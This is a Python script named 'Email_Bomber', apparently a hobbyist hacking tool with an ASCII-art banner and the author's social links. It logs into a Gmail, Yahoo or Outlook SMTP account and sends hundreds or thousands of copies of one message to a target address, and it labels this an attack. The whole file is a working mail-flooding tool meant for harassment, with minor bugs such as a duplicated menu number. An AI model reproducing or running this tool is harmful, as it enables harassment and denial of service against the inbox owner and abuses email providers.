try:
    import smtplib
    import sys
    import os
    from colorama import Fore, Back, Style
    from getpass import getpass
    
except ModuleNotFoundError:
    print(Fore.RED('+[+[+[ Initializing modules ]+]+]+\n'))
    os.system('pkg install sys')
    os.system('pkg install colorama')
    os.system('pkg install getpass')

os.system('cls' if os.name == 'nt' else 'clear')


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def banner():
    print(bcolors.GREEN + '''
 __          ___    _  ____             __  __   _____ 
 \ \        / / |  | |/ __ \      /\   |  \/  | |_   _|
  \ \  /\  / /| |__| | |  | |    /  \  | \  / |   | |  
   \ \/  \/ / |  __  | |  | |   / /\ \ | |\/| |   | |  
    \  /\  /  | |  | | |__| |  / ____ \| |  | |  _| |_ 
     \/  \/   |_|  |_|\____/  /_/    \_\_|  |_| |_____|
                                                       
                                                       ''')
    
    print(bcolors.GREEN + '''******************************************************
*''' + Fore.BLUE + ''' Facebook  ''' + Fore.RED + ''': ''' + Fore.YELLOW + '''https://m.me/whoami.hacker.2 ''' + Fore.GREEN + '''          *
* ''' + Fore.BLUE +  '''Instagram ''' + Fore.RED + ''':''' + Fore.YELLOW + ''' https://www.Instagram.com/who_am_i_c_p''' + Fore.GREEN + ''' *
* ''' + Fore.BLUE +  '''github    ''' + Fore.RED + ''':''' + Fore.YELLOW +  ''' https://github.com/WHOAMICP           ''' + Fore.GREEN + ''' *
******************************************************''')



class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+\n')
            self.target = str(input(bcolors.GREEN + 'Enter target email : '))
            print(bcolors.YELLOW + "\nSelected BOMB mode\n")
            print(bcolors.GREEN + "[1]" + bcolors.YELLOW + " 1000")
            print(bcolors.GREEN + "[2]" + bcolors.YELLOW + " 500")
            print(bcolors.GREEN + "[3]" + bcolors.YELLOW + " 250")
            print(bcolors.GREEN + "[4]" + bcolors.YELLOW + " CUSTOM\n")
            self.mode = int(input(bcolors.GREEN + '>> '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+\n')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount : '))
            print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+\n')
            print(bcolors.YELLOW + "Selected email type\n")
            print(bcolors.GREEN + "[1]" + bcolors.YELLOW + " Gmail")
            print(bcolors.GREEN + "[2]" + bcolors.YELLOW + " Yahoo")
            print(bcolors.GREEN + "[2]" + bcolors.YELLOW + " Outlook\n")
            self.server = str(input(bcolors.GREEN + '>> '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Enter port number : '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.GREEN + '\nEnter from address : '))
            self.fromPwd = str(getpass(bcolors.GREEN + 'Enter from password : '))
            self.subject = str(input(bcolors.GREEN + 'Enter subject : '))
            self.message = str(input(bcolors.GREEN + 'Enter message : '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(bcolors.RED + f'\nERROR: Login failed!!')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(bcolors.RED + f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
        sys.exit(0)


if __name__=='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()